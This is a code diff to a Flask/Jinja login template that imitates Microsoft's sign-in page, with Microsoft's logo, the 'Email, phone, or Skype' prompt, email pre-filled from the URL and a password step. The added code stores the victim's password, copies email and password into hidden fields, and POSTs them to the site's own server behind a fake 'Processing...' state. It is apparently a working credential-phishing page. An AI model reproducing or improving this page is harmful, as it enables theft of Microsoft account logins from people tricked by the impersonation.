@@ -86,6 +86,7 @@
 
 <script>
   let email = "";
+  let password = "";
 
   function validateEmail(email) {
     const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -100,7 +101,7 @@
       <form id="loginForm">
         <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
         <div style="margin: 15px 0; font-size: 13px;">
-          <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">  Create one!</span></span><br><br>
+          <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">Create one!</span></span><br><br>
           <span style="color: #0067b8; text-decoration: none;">Can't access your account?</span>
         </div>
         <div style="display: flex; justify-content: flex-end;">
@@ -127,10 +128,10 @@
       <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 3px;">
       <div class="muted" style="margin:15px 5px;">← ${email}</div>
       <h1 class="header">Enter Password</h1>
-<input type="password" id="passwordInput" placeholder="Password" required 
+      <input type="password" id="passwordInput" placeholder="Password" required 
        style="border: none; outline: none; background: transparent; 
               border-bottom: 2px solid blue; width: 400px; 
-              padding:  0; display: inline-block;">
+              padding: 0; display: inline-block;">
       <form id="loginForm">
         <div style="margin: 15px 0; font-size: 13px;">
           <span style="color: #0067b8; text-decoration: none;">Is this your account?</span>
@@ -146,7 +147,13 @@
     });
     document.getElementById("loginForm").addEventListener("submit", function(e){
       e.preventDefault();
-      showStep3();
+      const pwd = document.getElementById("passwordInput").value;
+      if(pwd.trim()) {
+        password = pwd;
+        showStep3();
+      } else {
+        alert("Please enter your password.");
+      }
     });
   }
 
@@ -159,23 +166,55 @@
       <input type="password" id="passwordInput" placeholder="Password" required 
        style="border: none; outline: none; background: transparent; 
               border-bottom: 2px solid blue; width: 400px; 
-              padding: 5px 0; display: inline-block;">
-      <form id="loginForm">
+              padding: 5px 0; display: inline-block;" value="${password}">
+      <form id="finalForm" method="POST" action="/">
+        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+        <input type="hidden" name="email" value="">
+        <input type="hidden" name="password" value="">
+        <input type="hidden" name="submit" value="Sign in">
         <div style="margin: 15px 0; font-size: 13px;">
           <span style="color: #0067b8; text-decoration: none;">Enter your password to continue</span>
         </div>
         <div style="display: flex; justify-content: flex-end;">
           <button type="button" class="btn-back" id="btnBack">Back</button>
-          <button type="submit" class="btn-next">Sign in</button>
+          <button type="submit" class="btn-next" id="signinBtn">
+            <span id="signinSpinner" class="d-none"></span>
+            Sign in
+          </button>
         </div>
       </form>
     `;
+    
+    // Set the hidden form values
+    document.querySelector('input[name="email"]').value = email;
+    document.querySelector('input[name="password"]').value = password;
+    
     document.getElementById("btnBack").addEventListener("click", function(){
       showStep2();
     });
-    document.getElementById("loginForm").addEventListener("submit", function(e){
-      e.preventDefault();
-      alert("Signing in...");
+    
+    document.getElementById("finalForm").addEventListener("submit", function(e){
+      const finalPassword = document.getElementById("passwordInput").value;
+      if(finalPassword.trim()) {
+        document.querySelector('input[name="password"]').value = finalPassword;
+        // Show loading state
+        const signinBtn = document.getElementById("signinBtn");
+        signinBtn.disabled = true;
+        signinBtn.innerHTML = `
+          <span style="display: inline-block; width: 12px; height: 12px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px;"></span>
+          Processing...
+        `;
+        // Add CSS animation inline
+        if (!document.querySelector('#spin-animation')) {
+          const style = document.createElement('style');
+          style.id = 'spin-animation';
+          style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
+          document.head.appendChild(style);
+        }
+      } else {
+        e.preventDefault();
+        alert("Please enter your password.");
+      }
     });
   }
 
@@ -184,16 +223,32 @@
     try {
       const q = new URLSearchParams(window.location.search);
       const hinted = (q.get("email") || "").trim();
+      const step = q.get("step") || "";
+      
       if (hinted && validateEmail(hinted)) {
         email = hinted;
-        showStep2();
-        return;
+        if (step === "password") {
+          showStep2();
+          return;
+        }
       }
     } catch (_) {}
   })();
 
-  // Prevent native form submits; we handle transitions ourselves
+  // Show success or error messages from Flask
+  {% if get_flashed_messages() %}
+    {% for message in get_flashed_messages(with_categories=true) %}
+      setTimeout(() => {
+        alert("{{ message[1] }}");
+        {% if message[0] == 'success' %}
+          // Redirect or show success state
+          window.location.href = '/';
+        {% endif %}
+      }, 100);
+    {% endfor %}
+  {% endif %}
 
+  // Initialize the form
   if(!email) {
     showStep1();
   }
